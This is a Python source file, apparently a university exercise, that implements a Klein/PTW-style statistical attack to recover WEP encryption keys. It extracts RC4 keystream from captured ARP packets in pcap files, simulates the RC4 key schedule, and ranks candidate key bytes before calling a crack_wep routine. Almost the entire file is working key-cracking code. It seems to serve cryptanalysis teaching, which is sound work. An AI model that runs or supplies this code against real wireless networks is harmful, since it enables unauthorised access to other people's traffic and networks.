import datetime
from collections import Counter

from Aufgabe_2.utils import log
from Aufgabe_2_3.pcap_tools.pcap.pcap import PCAP
from Aufgabe_2_3.pcap_tools.wep.wep import WEP
from Aufgabe_2_3.pcap_tools.wlan.wlan import IEEE802_11
from wep.klein_attack import crack_wep


def parse_pcap(filename):
    mypcap = PCAP(filename)
    pcaph = mypcap.header()
    known_headers = bytearray(
        [0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x08, 0x06, 0x00, 0x01, 0x08, 0x00, 0x06, 0x04, 0x00, 0x01])

    iv_stream_pair = []
    for packet in mypcap:
        if packet['len'] == 68:
            iv, k, ciphertext, icv = WEP(IEEE802_11(packet['data']).get_payload()).get()
            stream_key = bytearray([a ^ b for (a, b) in zip(ciphertext, known_headers)])
            iv_stream_pair.append(dict(iv=iv, stream_key=stream_key))
    return iv_stream_pair


def approximate(key_stream, s_box, s_box_prev, i, j, n):
    s_invert = []
    for init in range(n):
        s_invert.append(init)

    # Invert s-box
    for r in range(len(s_box)):
        s_invert[s_box[r]] = r

    # Calculate next key byte
    key_byte = (s_invert[((i + 1) - key_stream[(i + 1) - 1]) % n] - (s_box[i + 1] + j + s_box_prev[i]) % n) % n
    return key_byte


def simulate_permutation_2(part_of_key, n=256):
    """
    Approximate the permutation by simulating the first i steps
    of the key scheduling of RC4
    :param part_of_key: Known part of the main key
    :return: S-box permuted to step i-1
    """
    # Initialize s-box
    s = []
    for i in range(n):
        s.append(i)

    i, j = 0, 0
    # Calculate permutation for first i bytes
    s_prev = []
    for i in range(len(part_of_key)):
        s_prev = s
        j = (j + s[i] + part_of_key[i]) % n
        s[i], s[j] = s[j], s[i]
    return s, i, j, s_prev


def test(iv_stream_pair, tuple_amount, n):
    # Calculate K[i] + K[i+1] using
    # simulate_permutation_2 (additionally returns s_box permuted to step i ) and
    # approximate (altered calculate_key_byte function as in chapter 4 in 60 sec paper)
    candidates = []
    for index, tuple in enumerate(iv_stream_pair):
        if index > tuple_amount:
            break
        compound_key = bytearray()
        compound_key.extend(tuple.get('iv'))
        # Internal permutation S_(i-1) and index j at (i-1)th step
        s_box, i, j, s_box_prev = simulate_permutation_2(compound_key)
        # Calculate possible key byte K[i]
        next_key_byte = approximate(tuple.get('stream_key'), s_box, s_box_prev, i + 1, j, n)
        candidates.append(next_key_byte)

    # Save bytes with probability
    candidates_and_percentages = []
    for candidate_tuple in Counter(candidates).most_common(5):
        p = candidate_tuple[1] / tuple_amount
        candidates_and_percentages.append((candidate_tuple[0], p))
    # Sort tuples in descending order
    sorted_candidates = sorted(candidates_and_percentages, key=lambda x: x[1], reverse=True)
    print("Arithmetic sum, K[i]+K[i+1]: {}".format(sorted_candidates))

    print("Approximated key byte: {}".format(
        crack_wep(iv_stream_pair=iv_stream_pair, key_length_bytes=40, n=n, tuple_amount=tuple_amount)))


key_length = 40
n = 256

start = datetime.datetime.now()
key_length_bytes = int(key_length / 8)

# Retrieve sample set of bytearray tuples
log("Collection Key Stream ... ", level=0)

iv_stream_pair = []
iv_stream_pair = iv_stream_pair + parse_pcap("output-03.cap")
iv_stream_pair = iv_stream_pair + parse_pcap("output-05.cap")

tuple_amount = len(iv_stream_pair)

test(iv_stream_pair, 300000, n)

# log("Key Stream collected after {}ms".format(int((datetime.datetime.now() - start).total_seconds() * 1000)),
#    level=0)

# Crack wep by approximating main key bytes from (iv, stream cipher) pairs
# log("Start Hacking {} ms".format(int((datetime.datetime.now() - start).total_seconds() * 1000)), level=0)
# possible_key_set = crack_wep(iv_stream_pair=iv_stream_pair, key_length_bytes=key_length_bytes,
#                             tuple_amount=tuple_amount, n=256)

# ms_end = int((datetime.datetime.now() - start).total_seconds() * 1000)
# s_end = int((datetime.datetime.now() - start).total_seconds())

# key = test_keys(possible_key_set, (iv_stream_pair[0].get('iv'), iv_stream_pair[0].get('stream_key')))
# if key:
#    log("Key found after {}ms ({} seconds)".format(ms_end, s_end), level=0)
#    print(key)
